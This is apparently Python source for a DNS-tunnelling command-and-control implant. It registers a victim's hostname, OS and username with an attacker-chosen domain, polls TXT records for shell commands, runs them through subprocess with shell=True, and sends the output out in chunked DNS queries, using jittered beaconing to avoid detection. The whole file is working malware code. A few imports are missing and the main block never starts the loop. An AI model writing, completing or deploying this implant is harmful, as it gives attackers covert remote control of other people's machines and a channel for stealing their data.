import hashlib

class DNSC2Client:
    """DNS-based C2 beacon using TXT records for covert communication."""

    def __init__(self, c2_domain: str, resolver_ip: str = '8.8.8.8',
                 beacon_interval: int = 30):
        self.c2_domain = c2_domain
        self.beacon_interval = beacon_interval
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = [resolver_ip]
        self.agent_id = hashlib.md5(platform.node().encode()).hexdigest()[:8]

    def _query_txt(self, subdomain: str) -> str:
        """Query TXT record for a subdomain."""
        fqdn = f'{subdomain}.{self.c2_domain}'
        try:
            answers = self.resolver.resolve(fqdn, 'TXT')
            for rdata in answers:
                return str(rdata).strip('"')
        except Exception:
            return ''

    def _encode_data(self, data: str) -> str:
        """Base64 encode data for DNS-safe transmission."""
        return base64.b64encode(data.encode()).decode().replace('=', '-')

    def _decode_data(self, data: str) -> str:
        """Decode base64 data from DNS response."""
        padded = data.replace('-', '=') 
        try:
            return base64.b64decode(padded).decode()
        except Exception:
            return ''

    def register(self):
        """Register agent with C2 server."""
        info = f'{platform.node()}|{platform.system()}|{os.getlogin()}'
        encoded = self._encode_data(info)
        # Registration query: reg.<agent_id>.<encoded_info>.c2domain.com
        self._query_txt(f'reg.{self.agent_id}.{encoded}')
        print(f'[+] Registered as {self.agent_id}')

    def beacon(self) -> str:
        """Check in with C2 and retrieve command."""
        # Beacon query: cmd.<agent_id>.c2domain.com
        response = self._query_txt(f'cmd.{self.agent_id}')
        if response:
            return self._decode_data(response)
        return ''

    def send_result(self, result: str):
        """Send command output back via DNS queries (chunked)."""
        encoded = self._encode_data(result)
        # Split into 63-char chunks (DNS label limit)
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        for i, chunk in enumerate(chunks):
            self._query_txt(f'out.{self.agent_id}.{i}.{chunk}')

    def execute_command(self, cmd: str) -> str:
        """Execute a shell command and return output."""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return 'TIMEOUT'
        except Exception as e:
            return f'ERROR: {e}'

    def run(self):
        """Main beacon loop."""
        self.register()
        while True:
            try:
                cmd = self.beacon()
                if cmd:
                    if cmd == 'exit':
                        print('[*] Exit command received')
                        break
                    elif cmd.startswith('sleep '):
                        self.beacon_interval = int(cmd.split()[1])
                        self.send_result(f'Sleep set to {self.beacon_interval}s')
                    else:
                        output = self.execute_command(cmd)
                        self.send_result(output[:500])  # Truncate for DNS
            except Exception:
                pass

            # Jitter: +-20% of beacon interval
            import random
            jitter = self.beacon_interval * random.uniform(0.8, 1.2)
            time.sleep(jitter)

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print('Usage: python dns_c2_client.py <c2_domain> [resolver_ip]')
        sys.exit(1)
    domain = sys.argv[1]
    resolver = sys.argv[2] if len(sys.argv) > 2 else '8.8.8.8'
    client = DNSC2Client(domain, resolver)
